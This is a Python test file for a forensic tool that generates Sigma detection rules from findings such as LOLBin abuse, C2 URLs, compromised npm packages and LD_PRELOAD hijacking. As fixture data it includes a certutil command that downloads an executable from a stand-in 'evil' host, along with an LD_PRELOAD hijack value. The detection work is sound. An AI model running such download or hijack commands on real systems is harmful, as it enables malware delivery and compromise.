"""Sigma rule generation from findings."""

from __future__ import annotations

from pathlib import Path

import yaml

from digger.genrule.sigma import (
    finding_to_sigma, generate_sigma_rules, write_sigma_rules, _stable_uuid,
)


def _f(**kw):
    base = {
        "finding_uuid": "11111111-2222-3333-4444-555555555555",
        "detector": "lolbins",
        "severity": "high",
        "title": "LOLBin/LOTL abuse: certutil.exe",
        "summary": "certutil used for download/decode (LOLBAS).",
        "mitre": "T1140",
        "evidence": {"name": "certutil.exe",
                     "cmdline": "certutil.exe -urlcache -split -f http://evil/x.exe"},
    }
    base.update(kw)
    return base


def test_stable_uuid_is_deterministic():
    a = _stable_uuid("digger", "lolbins", "title")
    b = _stable_uuid("digger", "lolbins", "title")
    assert a == b


def test_lolbin_rule_has_expected_shape():
    rule = finding_to_sigma(_f(), case_id="case-1")
    assert rule is not None
    assert rule["status"] == "experimental"
    assert rule["logsource"] == {"category": "process_creation"}
    sel = rule["detection"]["selection"]
    assert "certutil.exe" in sel["Image|endswith"]
    assert "-urlcache" in sel["CommandLine|contains"]
    assert "attack.t1140" in rule["tags"]


def test_c2_url_pattern_emits_proxy_rule():
    rule = finding_to_sigma(_f(
        detector="c2", severity="high",
        title="Cobalt Strike URI in browser history",
        evidence={"framework": "Cobalt Strike", "pattern": ".*",
                  "url": "https://example.com/aaa9"},
    ))
    assert rule is not None
    assert rule["logsource"]["category"] == "proxy"
    assert "example.com" in rule["detection"]["selection"]["c-uri|contains"]


def test_shai_hulud_package_emits_file_rule():
    rule = finding_to_sigma(_f(
        detector="shai_hulud", severity="critical",
        title="Shai-Hulud compromised package: chalk@5.6.1",
        evidence={"project": "/proj", "package": "chalk@5.6.1"},
    ))
    assert rule is not None
    assert "/node_modules/chalk/package.json" in rule["detection"]["selection"]["TargetFilename|endswith"]
    assert rule["level"] == "critical"
    assert any(t.startswith("attack.supply_chain") for t in rule["tags"])


def test_env_hijack_emits_process_creation_rule():
    rule = finding_to_sigma(_f(
        detector="env_hijack", severity="high",
        title="LD_PRELOAD set in environment",
        evidence={"var": "LD_PRELOAD", "value": "/tmp/x.so"},
    ))
    assert rule is not None
    assert rule["logsource"]["category"] == "process_creation"
    sel_val = rule["detection"]["selection"]["EnvironmentVariables|contains"]
    assert "LD_PRELOAD=/tmp/x.so" == sel_val


def test_memory_anomaly_unmapped_returns_none():
    rule = finding_to_sigma(_f(
        detector="memory_anomaly", severity="high",
        title="RWX region(s) in pid 1234",
        evidence={"pid": 1234, "count": 1, "sample": []},
    ))
    assert rule is None


def test_write_emits_valid_yaml(tmp_path: Path):
    rules = generate_sigma_rules([
        _f(),
        _f(detector="env_hijack", title="LD_PRELOAD set", evidence={"var": "LD_PRELOAD", "value": "/tmp/x.so"}),
    ], case_id="case-x")
    written = write_sigma_rules(rules, tmp_path)
    assert len(written) == 2
    for p in written:
        loaded = yaml.safe_load(p.read_text())
        assert loaded["id"]
        assert loaded["title"]
        assert loaded["logsource"]
        assert loaded["detection"]
